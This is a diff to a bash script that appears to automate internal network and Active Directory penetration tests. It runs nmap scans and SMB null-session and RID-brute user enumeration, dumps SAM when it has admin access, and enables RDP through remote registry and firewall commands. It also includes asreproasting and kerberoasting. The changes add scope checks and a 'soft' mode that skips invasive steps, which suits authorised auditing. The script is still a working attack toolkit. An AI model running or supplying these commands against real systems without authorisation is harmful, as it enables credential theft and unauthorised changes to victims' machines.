@@ -40,7 +40,7 @@ starter() {
 	
 	# Paths
 	DIR=$ProjectName
-	logfile=$DIR/log_$Username.log
+	logfile=$DIR/log_${Username}_${date_log}.log
 	net=$(python3 -c "print('$rangeIP'.split('/')[0])")
 	DIR_PORTS="$DIR/ports"
 	DIR_VULNS="$DIR/vulns"
@@ -48,6 +48,7 @@ starter() {
 
 	# TimeReference
 	start=$SECONDS
+	date_log=$(date +"%Y_%m_%d_%Hh_%Mm")
 	
 	if [ ! -d "$DIR" ];then
 		mkdir $DIR
@@ -148,9 +149,10 @@ pop_logger () {
 }
 
 control_ip_attack() {
-	TARGET_IP="$ip"
+	#Calculate if the current IP is included within the networks targeted by the audit.
+	TARGET_IP="${ip}"
 	rangeIP_array=$(echo "$rangeIP" | tr ',' '\n')
-	for rangeIP_array_key in $rangeIP_array; do
+	while IFS= read -r rangeIP_array_key; do
 		NETWORK_LAN=$(ipcalc -n -b $rangeIP_array_key | grep "Address:" | awk '{print $2}')
 		NETWORK_LAN_BROADCAST=$(ipcalc -n -b $rangeIP_array_key | grep "Broadcast:" | awk '{print $2}')
 		# Fonction pour convertir les adresses IP en entiers
@@ -168,7 +170,7 @@ control_ip_attack() {
 		if [[ $network_start -le $target_ip_int && $network_end -ge $target_ip_int ]]; then
 			return 0
 		fi
-	done
+	done <<< "$rangeIP_array"
 	return 1
 }
 
@@ -247,7 +249,8 @@ nmap_fast () {
 		#log "${SPACE}[!] Nmap TCP report : ${DIR}/scan_nmap/scan_Fast_TCP.nmap"
 		log "${SPACE}[📂] UDP Scanning ..."
 		#UDP
-		nmap -Pn -sU $NMAP_HOSTS -R -oA $DIR/scan_nmap/scan_Full_UDP --open --top 25 -T4 --exclude $excluded_hosts >/dev/null 2>&1
+		UDP_PORTS=$(nmap -Pn -sU $NMAP_HOSTS -R --open --top 25 -T4 --exclude $excluded_hosts | grep -v filtered | grep -oP '^\d+(?=/udp)' | paste -sd',' -)
+		nmap -Pn -sU $NMAP_HOSTS -R -oA $DIR/scan_nmap/scan_Full_UDP -p --open $UDP_PORTS --top 25 -T4 --exclude $excluded_hosts
 	fi
 	
 	#log "${SPACE}[!] Nmap UDP report : ${DIR}/scan_nmap/scan_Full_UDP.nmap"
@@ -255,8 +258,8 @@ nmap_fast () {
 	#Convert to html
 	#TCP
 	sed -i 's/href="nmap\.xsl/href="file:\/\/\/usr\/bin\/\.\.\/share\/nmap\/nmap\.xsl/g' $DIR/scan_nmap/scan_Fast_TCP.xml
-	xsltproc $DIR/scan_nmap/scan_Fast_TCP.xml -o /tmp/scan_Fast_TCP.html
-	log "${SPACE}[!] Nmap TCP report in HTML format : /tmp/scan_Fast_TCP.html"
+	xsltproc $DIR/scan_nmap/scan_Fast_TCP.xml -o $DIR/scan_Fast_TCP.html
+	log "${SPACE}[!] Nmap TCP report in HTML format : $DIR/scan_Fast_TCP.html"
 	
 	#UDP
 	cat ${DIR}/scan_nmap/scan_Full_UDP.nmap | grep -v "open|filtered" > ${DIR}/scan_nmap/scan_Full_UDP_open.nmap
@@ -288,10 +291,10 @@ nmap_fast () {
 		}
 	}
 	' "$DIR/scan_nmap/scan_Full_UDP.xml" > "$DIR/scan_nmap/scan_Full_UDP_filtered.xml"
-	xsltproc $DIR/scan_nmap/scan_Full_UDP_filtered.xml -o /tmp/scan_Full_UDP.html
+	xsltproc $DIR/scan_nmap/scan_Full_UDP_filtered.xml -o $DIR/scan_Full_UDP.html
 	#Suppression des filtered|opened
-	awk 'BEGIN { RS="</tr>" } /open\|filtered/ { next } { printf "%s", $0 "</tr>" }' /tmp/scan_Full_UDP.html > /tmp/scan_Full_UDP_open.html
-	log "${SPACE}[!] Nmap UDP report in HTML format : /tmp/scan_Full_UDP_open.html"
+	awk 'BEGIN { RS="</tr>" } /open\|filtered/ { next } { printf "%s", $0 "</tr>" }' $DIR/scan_Full_UDP.html > $DIR/scan_Full_UDP_open.html
+	log "${SPACE}[!] Nmap UDP report in HTML format : $DIR/scan_Full_UDP_open.html"
 	
 	#Extracting IP from the 2 reports
 	grep -i 'Nmap scan report for' "${DIR}/scan_nmap/scan_Fast_TCP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${DIR}/hosts.txt
@@ -465,7 +468,6 @@ relay () {
 }
 
 manspider () {
-	#accessible_shares=$(cat )
 	if [ -e "$DIR_PORTS/445.txt" ]; then
 		max_size_files_checked="15M"
 		threads="100"
@@ -538,7 +540,7 @@ vulns () {
 				if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
 					if [[ -z $hostname ]];then
 						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-						host="$(echo $hostname | cut -d '.' -f 1)"
+						host="$hostname"
 					fi
 					$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds $kerberos -M $module $option_vulns < /dev/null > $DIR_VULNS/Vulns_Device_${ip}_$module.txt 2>/dev/null
 				fi
@@ -608,7 +610,7 @@ ftp () {
 					$proxychains netexec ftp ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ftp_${Username}_${ip}.txt 2>/dev/null 
 					# Vérifier le code de retour de la commande SSH
 					if grep -aq '\[+\]' $DIR_VULNS/ftp_${Username}_${ip}.txt; then
-						green_log "${SPACE}${SPACE}[💀] FTP connection successed with ${username} user"
+						green_log "${SPACE}${SPACE}[💀] FTP connection successed with ${Username} user"
 						blue_log "${SPACE}${SPACE} [+] $proxychains ftp $Username@$ip"
 					fi
 				fi
@@ -707,7 +709,7 @@ rdp () {
 						rdp_mode="KRB"
 						if [[ -n "$hostname" ]];then
 							kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-							host="$(echo $hostname | cut -d '.' -f 1)"
+							host="$hostname"
 						fi
 						if [[ -n "$Password" ]];then
 							NTLM=$(iconv -f ASCII -t UTF-16LE <(printf "${Password}") | openssl dgst -md4 | awk -F "= " '{print $2}')
@@ -727,7 +729,6 @@ rdp () {
 							fi
 						else
 							#Can be detected by disconnection
-							echo "$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot"
 							$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
 							check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
 							if [[ "$check_rdp" -gt 0 ]]; then
@@ -796,7 +797,7 @@ nfs () {
 				$proxychains showmount -e $ip < /dev/null > $DIR_VULNS/tmp_nfs.txt 2>/dev/null
 				if [ "$(wc -l < $DIR_VULNS/tmp_nfs.txt)" -gt 1 ]; then
 					green_log "${SPACE}[💀] NFS vulnerability detected on $ip"
-					blue_log "${SPACE}${SPACE} [+] showmount -e ${ip}"
+					blue_log "${SPACE}${SPACE}[+] showmount -e ${ip}"
 				fi
 			fi
 		done
@@ -901,9 +902,7 @@ snmp () {
 			onesixtyone -c "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt" -i "$DIR_PORTS/snmp.txt" -o "$DIR/communities.txt" -w 100 -q
 			sort -u "$DIR/communities.txt" -o "$DIR/communities.txt"
 			for ip in $(cat ${DIR_PORTS}/snmp.txt); do
-				echo $ip
 				if control_ip_attack; then
-					echo $ip
 					if grep -q "$ip" "$DIR/communities.txt"; then
 						hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
 						COMMUNITY=$(grep "$ip" "$DIR/communities.txt" | awk -F'[][]' '{print $2}')
@@ -914,7 +913,6 @@ snmp () {
 
 					result_v2c=""
 					result_v2c=$(timeout $SNMP_TIMEOUT snmpwalk -v 2c -c public $ip )
-					echo "timeout $SNMP_TIMEOUT snmpwalk -v 2c -c public $ip"
 					if [[ -n "$result_v2c" ]]; then
 						green_log "${SPACE}[💀] SNMP v2c in PUBLIC community found on $ip ($hostname) : ${DIR_VULNS}/SNMP-Public_v2c.txt"
 						echo "$result_v2c" >> "${DIR_VULNS}/SNMP-Public_v2c.txt"
@@ -942,7 +940,6 @@ ldap () {
 		sort -u ${DIR}/IP_FQDN_ldap.txt -o ${DIR}/IP_FQDN_ldap.txt
 		#Extraction of one line (ip + hostname) from the LDAP server (AD) for each domain/sub-domain. The aim is not to carry out the attack on 3 DCs in the same domain
 		awk -F ':' '{ split($2, parts, "."); domain = parts[2] "." parts[3] "." parts[4] "." parts[5]  "." parts[6]; if (!seen[domain]++) print $0;}' ${DIR}/IP_FQDN_ldap.txt >> ${DIR}/IP_FQDN_ldap_filtered.txt
-		cat ${DIR}/IP_FQDN_ldap_filtered.txt
 		LDAP_ip=$(cat ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f1)
 		LDAP_domain_old=()
 		for ip in $LDAP_ip; do
@@ -996,7 +993,7 @@ ldap () {
 	if [[ -n "$LDAP_Servers" ]] && [[ "$Username" != "anonymous" ]]; then
 		log "[🔍] Enumeration via LDAP"
 		for module in ${ldap_modules[@]};do
-			echo $LDAP_Servers | while read ip;do
+			for ip in $LDAP_Servers;do
 				if control_ip_attack; then
 					host=${ip}
 					$proxychains timeout $CME_TIMEOUT netexec ldap $host -u $Username $cme_creds -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
@@ -1005,13 +1002,10 @@ ldap () {
 						hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
 						if [[ -n "$hostname" ]];then
 							kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-							host="$(echo $hostname | cut -d '.' -f 1)"
+							host="$hostname"
 						else
+							kerberos=""
 							host="$ip"
-						fi
-						if [[ -n "$hostname" ]];then
-							kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-							host="$(echo $hostname | cut -d '.' -f 1)"
 						fi
 						$proxychains timeout $CME_TIMEOUT netexec ldap $host -u $Username $cme_creds $kerberos -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
 					fi
@@ -1050,7 +1044,7 @@ mssql () {
 					hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
 					if [[ -n "$hostname" ]];then
 						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-						host="$(echo $hostname | cut -d '.' -f 1)"
+						host="$hostname"
 					else
 						kerberos=""
 						host="${ip}"
@@ -1089,32 +1083,35 @@ smb () {
 
 				#Anonymous / null session is allowed ?
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --shares > ${DIR_VULNS}/smb/cme_${ip}_null_session_shares 2>/dev/null
-				if grep -aq '\[+\]' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
+				if grep -aq '\[+\]' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares" && ! grep -aq "STATUS_ACCESS_DENIED" "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
 					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
 						green_log "${SPACE}${SPACE}[💀] Null session (anonymous) allowed"
-						if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
-							green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_null_session_shares"
-							blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 --exclude IPC$"
-						fi
+						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_null_session_shares"
+						blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 --exclude IPC$"
 					fi
 					
 					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute 2>/dev/null
-					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+							sed 's/.*\\//' | awk '{print $1}' | tee -a ${DIR_VULNS}/smb/cme_${ip}_local_users.txt ${DIR}/users.txt
+					if [[ $(wc -l < "${DIR_VULNS}/smb/cme_${ip}_local_users.txt") -gt 0 ]]; then
+						green_log "${SPACE}${SPACE}[💀] New local users found -> ${DIR_VULNS}/smb/cme_${ip}_local_users.txt AND ${DIR}/users.txt"
+					fi
 					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
 					## Injecter ces utilisateurs dans un fichier
 					
 					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
 							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
 							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
-							column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+							column -t -s ':' | tee -a ${DIR}/users_with_descriptions.txt ${DIR_VULNS}/smb/cme_${ip}_users.txt
 					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
 							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt				
 					## Supprimer les doublons
 					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 					sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
+					sort -u ${DIR_VULNS}/smb/cme_${ip}_users.txt -o ${DIR_VULNS}/smb/cme_${ip}_users.txt
 					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
 							awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
-					if [[ "$check_smb" -gt 0 ]]; then
+					if [[ "$check_smb" -gt 0 ]] && ! grep -iq "Exception" ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute; then
 						green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
 					fi
 				fi
@@ -1129,30 +1126,25 @@ smb () {
 					fi
 					
 					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
-					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
-							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
-							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
-							column -t -s ':' >> ${DIR}/users_with_descriptions.txt
 					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
-							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt
+							sed 's/.*\\//' | awk '{print $1}' | tee -a ${DIR_VULNS}/smb/cme_${ip}_users.txt ${DIR}/users.txt 
 					
 					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
-					
 					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
 							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
 							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
-							column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+							column -t -s ':' | tee -a ${DIR}/users_with_descriptions.txt ${DIR_VULNS}/smb/cme_${ip}_users.txt
 					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
-							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt				
+							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt
 					
 					## Supprimer les doublons
 					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 					sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
+					sort -u ${DIR_VULNS}/smb/cme_${ip}_users.txt -o ${DIR_VULNS}/smb/cme_${ip}_users.txt
 					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
 							awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
-					echo $check_smb
-					if [[ "$check_smb" -gt 0 ]]; then
-						green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
+					if [[ "$check_smb" -gt 0 ]] && ! grep -iq "Exception" ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute ${DIR_VULNS}/smb/cme_${ip}_guest_users; then
+						green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR_VULNS}/smb/cme_${ip}_users.txt AND ${DIR}/users.txt"
 					fi
 				fi
 				# Can i connect with input user ?
@@ -1162,7 +1154,7 @@ smb () {
 						#If NTLM is not supported, restart with kerberos
 						if [[ -n "$hostname" ]];then
 							kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-							host="$(echo $hostname | cut -d '.' -f 1)"
+							host="$hostname"
 						fi
 						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_$Username 2>/dev/null
 					else
@@ -1189,16 +1181,13 @@ smb () {
 				
 				if [ "$can_connect" = "1" ]; then
 					#List available shares
-					# Do not do it again if it's anonymous user. It is do at the SMB check beginning
-					if [ "$Username" != "anonymous" ]; then
-						$proxychains netexec smb -u "$Username" $cme_creds --shares < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username 2>/dev/null
-						if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username"; then
-							green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username"
-							if [[ -n "$Password" ]]; then
-								blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
-							elif [[ -n "$NT_Hash" ]]; then
-								blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
-							fi
+					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --shares < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username 2>/dev/null
+					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username"; then
+						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username"
+						if [[ -n "$Password" ]]; then
+							blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
+						elif [[ -n "$NT_Hash" ]]; then
+							blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
 						fi
 					fi
 					
@@ -1238,7 +1227,7 @@ smb () {
 						sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
 					fi
 					
-					if [ "$admin" = "1" ]; then
+					if [ "$admin" = "1" ] && [ "$soft" != "true" ]; then
 						###### DUMP SAM ######
 						$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos --sam < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_sam 2>/dev/null
 						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_sam | wc -l)
@@ -1310,8 +1299,6 @@ smb () {
 							if ! grep -q "$ip" $DIR_PORTS/3389.txt;then 
 								#Enable RDP in registry
 								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
-								echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'"
-								echo "${DIR_VULNS}/smb/cme_${ip}_enabling_rdp"
 								#Allow RDP connexion on the machine
 								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
 								actual_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes'"
@@ -1401,7 +1388,7 @@ users () {
 	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
 		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
 		hostname=$(grep -E "^$DC_ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-		DC_host="$(echo $hostname | cut -d '.' -f 1)"
+		DC_host="$hostname"
 		domain=$(echo "$hostname" | cut -d '.' -f 2-)
 		log "[🔍] Extracting AD users ..."
 		if [[ "$Username" != "anonymous" ]]; then
@@ -1430,7 +1417,7 @@ asp (){
 	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
 		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
 		hostname=$(grep -E "^$DC_ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-		DC_host="$(echo $hostname | cut -d '.' -f 1)"
+		DC_host="$hostname"
 		domain=$(echo "$hostname" | cut -d '.' -f 2-)
 		mkdir $DIR_VULNS/krb
 		log "[🔍] Starting asreproasting attack ..."
@@ -1452,6 +1439,8 @@ asp (){
 		if grep -q 'asrep' "$DIR_VULNS/krb/asreproasting_Users.txt"; then
 			green_log "${SPACE}[💀] Great, there are asreproastable accounts found -> $DIR_VULNS/krb/asreproasting_Users.txt"
 			blue_log "${SPACE} [+] Use hashcat -m 18200 ... to bang them passwords"
+		elif grep -q 'KDC_ERR_KEY_EXPIRED' "$DIR_VULNS/krb/asreproasting_Users.txt"; then
+			green_log "${SPACE}[💀] Found asreproastable accounts BUT all have expired passwords -> $DIR_VULNS/krb/asreproasting_Users.txt"
 		fi
 	fi
 }
@@ -1460,7 +1449,8 @@ krb () {
 	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
 		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
 		hostname=$(grep -E "^$DC_ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-		DC_host="$(echo $hostname | cut -d '.' -f 1)"
+		#DC_host="$(echo $hostname | cut -d '.' -f 1)"
+		DC_host="$hostname"
 		domain=$(echo "$hostname" | cut -d '.' -f 2-)
 		mkdir $DIR_VULNS/krb
 		log "[🔍] Checking SPN users (kerberoast) ..."
@@ -1533,13 +1523,10 @@ nmap_full () {
 		rm $DIR/scan_nmap/*.gnmap
 	fi
 	
-	xsltproc $DIR/scan_nmap/scan_Full_TCP.xml -o /tmp/scan_Full_TCP.html
-	xsltproc $DIR/scan_nmap/scan_Full_UDP.xml -o /tmp/scan_Full_UDP.html
-	#Suppression des filtered|opened
-	awk 'BEGIN { RS="</tr>" } /open\|filtered/ { next } { printf "%s", $0 "</tr>" }' /tmp/scan_Full_UDP.html > /tmp/scan_Full_UDP_open.html
+	xsltproc $DIR/scan_nmap/scan_Full_TCP.xml -o $DIR/scan_Full_TCP.html
 	
-	log "${SPACE}File TCP in HTML format available to -> /tmp/scan_Full_TCP.html"
-	log "${SPACE}File UDP in HTML format available to -> /tmp/scan_Full_UDP_open.html"
+	log "${SPACE}File TCP in HTML format available to -> $DIR/scan_Full_TCP.html"
+	log "${SPACE}File UDP in HTML format available to -> $DIR/scan_Full_UDP_open.html"
 }
 
 ########################### TREE COMMAND ##################################
@@ -1573,6 +1560,7 @@ Help() {
     echo "  -e  Execute all functions, but exclude specific functions (-e rdp,winrm)"
     echo "  -s  Select specific functions (-s rdp,winrm)"
     echo "  -m  Discovery mode : basic=ARP+ping(faster)(Default mode) ; no-ping=no ping requests on machines(slower but more accurate)"
+	echo "  -M  Modifications or alerts on target systems (e.g., LSA, SAM, NTDS extraction, RDP enabling, Kerberoasting) will not be performed"
     echo "  -r  Restore modifications"
     echo "  -h  Display help"
     echo
@@ -1583,7 +1571,7 @@ Help() {
     exit 1
 }
 
-while getopts "o:i:u:p:H:t:e:s:m:fhr" option; do
+while getopts "o:i:u:p:H:t:e:s:m:fhMr" option; do
     case $option in
         o) ProjectName=$OPTARG;;
         i) INTERFACE=$OPTARG;;
@@ -1595,6 +1583,7 @@ while getopts "o:i:u:p:H:t:e:s:m:fhr" option; do
         e) excluded_funcs=$OPTARG;;
         s) selected_funcs=$OPTARG;;
 		m) discovery_mode=$OPTARG;;
+		M) soft=true;;
         r) restore=true;;
         h) Help;;
         \?) echo "Erreur : Option invalide"; Help;;
